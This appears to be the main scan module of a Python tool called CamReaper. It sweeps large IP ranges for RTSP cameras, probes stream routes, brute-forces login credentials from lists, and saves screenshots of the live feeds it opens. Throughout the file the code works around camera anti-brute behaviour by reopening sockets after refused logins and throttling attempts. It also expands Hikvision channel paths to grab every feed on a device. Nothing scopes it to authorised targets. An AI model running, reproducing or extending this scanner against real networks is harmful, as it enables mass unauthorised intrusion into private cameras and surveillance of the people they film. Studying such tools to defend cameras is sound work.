"""Asynchronous RTSP scanner: host filter -> route -> credentials -> screenshot.

Every host is handled by an independent coroutine; a global semaphore bounds
the number of in-flight network host-pipelines (instead of thousands of
blocking threads).  Screenshots happen in a bounded process pool so FFmpeg
decoding never stalls the event loop.

Semantics:

* Only an RTSP ``200`` confirms a route.
* ``401``/``403`` means "host is alive and requires auth" - it is passed on to
  credential bruting even when no route is confirmed.
* Only a *confirmed working* stream (a route returning ``200`` with the right
  credentials) is recorded.
"""

import asyncio
import sys
from dataclasses import dataclass, field
from pathlib import Path

from CamReaper import report
from CamReaper.report import record_failed, record_gallery, record_no_auth, record_url
from CamReaper.rtsp import RTSPClient, Status
from CamReaper.vendor import detect_vendor

DUMMY_ROUTE = "/0x8b6c42"

# After this many consecutive transport failures (read timeouts / dropped
# sockets - NOT a 401/403) a host is abandoned: a camera that accepts but goes
# silent mid-brute would otherwise burn ~two socket timeouts per credential.
MAX_TRANSPORT_FAILS = 2

AUTH_CODES = {"401", "403"}


@dataclass
class Found:
    ip: str
    port: int
    route: str
    credentials: str
    vendor: str = "Generic"

    def url(self) -> str:
        return RTSPClient.get_rtsp_url(self.ip, self.port, self.credentials, self.route)


@dataclass
class Settings:
    ports: list = field(default_factory=lambda: [554])
    routes: list = field(default_factory=list)
    credentials: list = field(default_factory=list)
    timeout: float = 2.0
    host_concurrency: int = 200
    failed_file: Path = None  # log reachable-but-unconfirmed hosts here
    failed_with_error: bool = False
    no_auth_file: Path = None  # log hosts where no credential worked
    screenshot_concurrency: int = 20
    pics_dir: Path = field(default_factory=lambda: Path("pics"))
    enable_screenshots: bool = True
    screenshot_timeout: float = 10.0
    max_attempts: int = 0
    max_transport_fails: int = 2
    attempts_per_sec: float = 0.0
    host_timeout: float = 0.0  # 0 = unlimited; wall-clock cap for one host
    route_parallel: int = 8  # 0 = serial
    status_interval: float = 5.0  # seconds between live status callbacks


async def _try_auth(client: RTSPClient, cred: str, route: str):
    """One authenticated DESCRIBE tolerant of dropped keep-alive sockets.

    Returns ``(status_code, still_connected)``.
    """
    if not client.is_connected and not await client.connect(client.port):
        return "", False
    ok = await client.authorize(client.port, route, cred)
    if not ok:
        # Camera closed the connection - retry once on a fresh socket.
        if await client.connect(client.port):
            ok = await client.authorize(client.port, route, cred)
    return client.status_code, client.is_connected


async def _reconnect(client: RTSPClient, attempts: int = 3) -> bool:
    """Open a fresh connection, retrying a few times on transient TCP failure.

    Handles the immediate-reconnect flap right after ``close()`` (half-open
    socket, server backlog, network blip) with a short bounded retry.  It does
    NOT try to wait out a prolonged anti-brute lockout - that is handled at the
    caller level by throttling how often we open fresh connections.
    """
    pause = 0.15
    for i in range(attempts):
        if client.is_connected:
            return True
        if await client.connect(client.port):
            return True
        await asyncio.sleep(pause)
        pause = min(pause * 2, 0.6)
    return False


async def _probe_routes(
    client: RTSPClient, routes, cred: str, route_parallel: int, deadline=None,
    max_transport_fails: int = 2,
):
    if route_parallel <= 1:
        return await _probe_routes_serial(client, routes, cred, deadline, max_transport_fails)
    return await _probe_routes_parallel(client, routes, cred, route_parallel, deadline)


async def _probe_routes_serial(client: RTSPClient, routes, cred: str, deadline=None, max_transport_fails: int = 2):
    """Return the first route that yields 200 with ``cred`` (or None).

    A fresh TCP connection is used for every route once the current one has
    answered 401: many cameras (Hikvision among them) start refusing even
    their open routes mid-session after a burst of 401s on the SAME socket,
    but happily serve them 200 on a brand-new connection.  We reset the
    socket before each route lazily so hosts that answer 200 immediately
    stay on the fast keep-alive path.
    """
    transport_fails = 0
    need_fresh = False
    now = asyncio.get_running_loop().time
    for route in routes:
        if deadline is not None and now() >= deadline:
            return None
        if need_fresh:
            client.close()
            need_fresh = False
        if not client.is_connected and not await _reconnect(client):
            return None
        code, _ = await _try_auth(client, cred, route)
        if code == "200":
            return route
        if code in AUTH_CODES:
            need_fresh = True
            transport_fails = 0
            continue
        transport_fails += 1
        if transport_fails >= max_transport_fails:
            return None
    return None


async def _probe_routes_parallel(
    client: RTSPClient, routes, cred: str, route_parallel: int, deadline=None
):
    """Return the first route that yields 200 with ``cred`` (or None).

    Each route is probed on its own fresh connection, bounded by
    ``route_parallel`` concurrent slots.  The first ``200`` wins.
    """
    sem = asyncio.Semaphore(route_parallel)
    result: str = None
    _lock = asyncio.Lock()
    _done = asyncio.Event()

    async def _try_one(route: str):
        nonlocal result
        if _done.is_set() or result is not None:
            return
        if deadline is not None and asyncio.get_running_loop().time() >= deadline:
            return
        async with sem:
            if _done.is_set() or result is not None:
                return
            fresh = RTSPClient(client.ip, client.port, client.timeout, ":")
            if not await fresh.connect():
                return
            try:
                code, _ = await _try_auth(fresh, cred, route)
                if code == "200":
                    async with _lock:
                        if result is None:
                            result = route
                            _done.set()
            except Exception:
                pass
            finally:
                fresh.close()

    tasks = [asyncio.create_task(_try_one(r)) for r in routes]
    await asyncio.gather(*tasks, return_exceptions=True)
    return result


async def probe_all_routes(
    client: RTSPClient, routes, creds, route_parallel: int = 0
) -> list:
    """Return EVERY route (from ``routes``) that answers 200 on ``client``.

    Used by ``--scan-channels`` to discover all open streams of one confirmed
    camera - unlike ``_probe_routes`` (which stops at the first hit) this keeps
    the whole set so a multi-channel DVR yields every channel, not just one.

    Each route is tried on a fresh connection with ``creds``.  ``route_parallel``
    bounds concurrency (<=1 = serial).  Only plain ``200`` responses count; 401s
    and transport failures are skipped.  Returns the list of open routes (each
    starting with ``/``), possibly empty.
    """
    ip, port, timeout = client.ip, client.port, client.timeout
    routes = list(routes)
    if not routes:
        return []

    if route_parallel <= 1:
        return await _probe_all_serial(ip, port, timeout, routes, creds)

    sem = asyncio.Semaphore(route_parallel)
    found: list = []
    lock = asyncio.Lock()

    async def _try_one(route: str):
        async with sem:
            fresh = RTSPClient(ip, port, timeout, creds)
            if not await fresh.connect():
                return
            try:
                code, _ = await _try_auth(fresh, creds, route)
                if code == "200":
                    async with lock:
                        found.append(route)
            except Exception:
                pass
            finally:
                fresh.close()

    tasks = [asyncio.create_task(_try_one(r)) for r in routes]
    await asyncio.gather(*tasks, return_exceptions=True)
    return found


async def _probe_all_serial(ip, port, timeout, routes, creds) -> list:
    found: list = []
    for route in routes:
        fresh = RTSPClient(ip, port, timeout, creds)
        if not await fresh.connect():
            continue
        try:
            code, _ = await _try_auth(fresh, creds, route)
            if code == "200":
                found.append(route)
        except Exception:
            pass
        finally:
            fresh.close()
    return found


def _failure_reason(client: RTSPClient, code: str) -> str:
    """Short human-readable reason for a reachable-but-unconfirmed port.

    Cheap: everything here is already tracked by the scan (no extra work),
    which is why surfacing the error does not slow the run.
    """
    if code:
        return f"rtsp-{code}"
    if client.status is Status.TIMEOUT:
        return "timeout"
    if client.status is Status.UNIDENTIFIED:
        return "error"
    return "no-response"


async def _handle_host(ip: str, s: Settings) -> list:
    """Run the full pipeline for one IP.  Returns a list of Found streams."""
    found: list = []

    # ---- stage 1: find a live port that "responds" (200/401/403) ----
    live: RTSPClient = None
    vendor = "Generic"
    for port in s.ports:
        client = RTSPClient(ip, port, s.timeout, ":")
        if not await client.connect(port):
            continue
        await client.authorize(port, DUMMY_ROUTE, ":")
        code = client.status_code
        if code == "200":
            # The camera answers 200 to an arbitrary (dummy) route, so it needs
            # no password.  But only ``rtsp://ip:port/`` is recorded once ``/``
            # itself is actually confirmed - a camera that 200s on the dummy yet
            # gates ``/`` (Hikvision-style query-route cameras, etc.) must not
            # produce a bogus open-stream URL.  Such a host is kept as ``live``
            # and left to the no-credential route sweep to pin down for real.
            # (Note: some cameras close the socket right after answering, so the
            # confirming probe can fail at the transport level even for healthy
            # hosts - never treat that as a reason to skip the host.)
            await client.authorize(port, "/", ":")
            if client.status_code == "200":
                found.append(Found(ip, port, "/", ":", vendor))
                client.close()
                return found
            live = client
            vendor = detect_vendor(client.data) if client.data else "Generic"
            break
        if code in AUTH_CODES:
            live = client
            vendor = detect_vendor(client.data) if client.data else "Generic"
            break
        # Port was open (TCP established) but no valid RTSP response came
        # back - a reachable-but-unconfirmed host.  Only these are logged,
        # and only when the user opted in via --failed-file.
        await record_failed(
            ip,
            port,
            _failure_reason(client, code) if s.failed_with_error else "",
        )
        client.close()

    if live is None:
        return found

    # A pathological camera (accepts the port but stalls mid-brute) must not
    # occupy its host slot for ~one timeout per credential.  Enforce a
    # wall-clock budget and give up early on repeated transport failures.
    loop = asyncio.get_running_loop()
    deadline = loop.time() + s.host_timeout if s.host_timeout > 0 else None

    # ---- stage 2: find a route that works without credentials ----
    # Sweep the FULL route list without credentials.
    # Many cameras (e.g. Hikvision) answer 200 on a specific query route such
    # as "/cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif" while
    # returning 401 on the common ones - they are "open" but only on that route.
    # Skipping this sweep means finding fewer cameras: such a host would
    # otherwise drop straight into credential bruting, fail, and be reported
    # as not found although no password was ever needed.
    #
    # The sweep is still bounded: a per-host wall-clock deadline caps the total
    # work, and a host that stalls at the transport level (timeout / socket
    # dropped mid-request) is abandoned after a couple of failures so a silent
    # camera doesn't grind the whole route list.
    route = await _probe_routes(
        live, ["/"] + list(s.routes), ":", s.route_parallel, deadline,
        s.max_transport_fails,
    )
    if route:
        found.append(Found(ip, live.port, route, ":", vendor))
        live.close()
        return found

    # ---- stage 3: brute-force credentials ----
    attempts = 0
    transport_fails = 0
    need_fresh = False
    next_allowed = 0.0
    interval = 1.0 / s.attempts_per_sec if s.attempts_per_sec > 0 else 0.0
    for cred in s.credentials:
        if s.max_attempts and attempts >= s.max_attempts:
            break
        if deadline is not None and loop.time() >= deadline:
            break
        if need_fresh or not live.is_connected:
            if need_fresh:
                # connect() would reuse the live socket - force a new one.
                live.close()
            if not await _reconnect(live):
                # connection unrecoverable - give up on this host
                break
            need_fresh = False
        attempts += 1
        if interval:
            now = loop.time()
            if now < next_allowed:
                await asyncio.sleep(next_allowed - now)
            next_allowed = max(now, next_allowed) + interval
        code, live_ok = await _try_auth(live, cred, "/")
        if code == "200":
            found.append(Found(ip, live.port, "/", cred, vendor))
            live.close()
            return found
        if code == "404":
            # Credentials are valid, route is wrong - sweep routes for a 200.
            good = await _probe_routes(live, s.routes, cred, s.route_parallel, deadline,
                                       s.max_transport_fails)
            if good:
                found.append(Found(ip, live.port, good, cred, vendor))
                live.close()
                return found
            # Valid creds but no working route -> NOT a confirmed stream.
            live.close()
            return found
        if code in AUTH_CODES:
            # Clean 401/403 - next credential goes on a fresh connection, since
            # some cameras start refusing valid credentials mid-session after a
            # burst of 401s on the same socket.
            transport_fails = 0
            need_fresh = True
        else:
            # Transport trouble (read timeout / dropped socket mid-request) or a
            # server-side error: a flaky-or-blocking unit.  Don't grind every
            # remaining credential through it.  (A clean 401 that just closes
            # the socket afterwards is NOT a flake - many cameras do that and
            # the next credential legitimately reconnects.)
            transport_fails += 1
            if transport_fails >= s.max_transport_fails:
                break

    live.close()
    if not found:
        # A live RTSP port was confirmed (it challenged us with 401/403) but no
        # open route and no credential in the list opened a stream.  Only the
        # user opted in via --no-auth-file is this recorded; these are few
        # (real, confirmed cameras we couldn't open), not the closed ports.
        await record_no_auth(ip, live.port)
    return found


async def _screenshot_worker(queue: asyncio.Queue, s: Settings, counter: dict):
    from CamReaper import screenshot

    while True:
        found: Found = await queue.get()
        if found is None:
            queue.task_done()
            break
        try:
            if s.enable_screenshots:
                url = found.url()
                # Hikvision multi-channel expansion.
                if "/Streaming/Channels/101/" in url:
                    got = False
                    for i in range(1, 17):
                        variant = url.replace(
                            "/Streaming/Channels/101/", f"/Streaming/Channels/{i}01/"
                        )
                        pic = await screenshot.capture(
                            variant, s.pics_dir, s.screenshot_timeout
                        )
                        if pic:
                            got = True
                            await record_gallery(variant, f"pics/{Path(pic).name}")
                    # got=False means no channel yielded a frame: the stream is
                    # confirmed (found) but undecodable via PyAV.
                    counter["screenshots"] += int(got)
                    counter["found_no_frame"] += int(not got)
                else:
                    pic = await screenshot.capture(
                        url, s.pics_dir, s.screenshot_timeout
                    )
                    counter["screenshots"] += int(bool(pic))
                    counter["found_no_frame"] += int(not bool(pic))
                    if pic:
                        await record_gallery(url, f"pics/{Path(pic).name}")
        finally:
            queue.task_done()


async def run(iter_targets, s: Settings, on_counter=None, on_status=None) -> dict:
    """Drive the whole scan.  ``iter_targets`` is an async iterator of IPs.
    Returns a stats dict.

    Hosts are scheduled in bounded batches (at most one pending task per
    host-concurrency slot) instead of eagerly creating a task per target - so
    a multi-million-IP list does not balloon memory or freeze the loop.

    ``on_counter`` is called as ``on_counter(stats, ip)`` once per finished
    host.  ``on_status`` (if given) receives an info dict about every 5s so a
    caller can render a live status line without fighting a progress bar;
    without it the watchdog prints one line per tick.
    """
    sem = asyncio.Semaphore(s.host_concurrency)
    result_queue: asyncio.Queue = asyncio.Queue()

    stats = {
        "checked": 0,
        "found": 0,
        "screenshots": 0,
        "found_no_frame": 0,  # confirmed stream whose capture returned no frame
        "vendors": {},  # vendor -> count of confirmed streams
        "ports": {},  # port -> count of confirmed streams
    }
    # ip -> monotonic start time of the in-flight host pipeline, so the
    # watchdog can surface a stalled tail instead of a silent trickle.
    inflight: dict = {}
    loop = asyncio.get_running_loop()
    run_started = loop.time()

    async def _guard(ip):
        t_start = asyncio.get_running_loop().time()
        inflight[ip] = t_start
        try:
            async with sem:
                found = await _handle_host(ip, s)
                if found:
                    stats["found"] += len(found)
                    for f in found:
                        await record_url(f.url())
                        await result_queue.put(f)
                        vendors = stats["vendors"]
                        vendors[f.vendor] = vendors.get(f.vendor, 0) + 1
                        ports = stats["ports"]
                        ports[str(f.port)] = ports.get(str(f.port), 0) + 1
                stats["checked"] += 1
                if on_counter:
                    on_counter(stats, ip)
        finally:
            inflight.pop(ip, None)

    async def _watchdog():
        def green(s):  # minimal ANSI color helper for the progress line
            if not sys.stdout.isatty():
                return s
            return f"\033[32m{s}\033[0m"

        try:
            while True:
                await asyncio.sleep(s.status_interval)
                now = asyncio.get_running_loop().time()
                elapsed = now - run_started
                if inflight:
                    longest = max(inflight, key=inflight.get)
                    oldest = f"{longest} ({(now - inflight[longest]):.0f}s)"
                else:
                    oldest = "-"
                info = {
                    "elapsed": elapsed,
                    "checked": stats["checked"],
                    "found": stats["found"],
                    "screenshots": stats["screenshots"],
                    "inflight": len(inflight),
                    "oldest": oldest,
                }
                if on_status is not None:
                    on_status(info)
                else:
                    print(
                        f"[worker] elapsed={info['elapsed']:.0f}s "
                        f"checked={green(info['checked'])} "
                        f"found={green(info['found'])} "
                        f"screenshots={green(info['screenshots'])} "
                        f"inflight={info['inflight']} oldest={oldest}"
                    )
        except asyncio.CancelledError:
            raise

    workers = []
    for _ in range(s.screenshot_concurrency):
        t = asyncio.create_task(_screenshot_worker(result_queue, s, stats))
        workers.append(t)

    watchdog = asyncio.create_task(_watchdog())
    pending = []
    gen = iter_targets.__aiter__()
    try:
        while True:
            while len(pending) < s.host_concurrency:
                try:
                    ip = await gen.__anext__()
                except (StopAsyncIteration, AttributeError):
                    break
                pending.append(asyncio.create_task(_guard(ip)))
            if not pending:
                break
            done, pending_set = await asyncio.wait(
                pending, return_when=asyncio.FIRST_COMPLETED
            )
            for task in done:
                task.result()  # re-raise exceptions from host pipelines
            pending = list(pending_set)
    finally:
        aclose = getattr(gen, "aclose", None)
        if aclose is not None:
            await aclose()
        if not watchdog.done():
            watchdog.cancel()
            await asyncio.gather(watchdog, return_exceptions=True)

    for _ in workers:
        await result_queue.put(None)
    await asyncio.gather(*workers)
    for t in workers:
        if not t.done():
            t.cancel()

    if on_status is None and on_counter is None:
        # Standalone use (tests / embedding): print a plain summary.
        print(
            f"[done] elapsed={loop.time() - run_started:.0f}s "
            f"checked={stats['checked']} found={stats['found']} "
            f"screenshots={stats['screenshots']}"
        )
    await report.close_report_files()  # flush + create any pending report files
    return stats
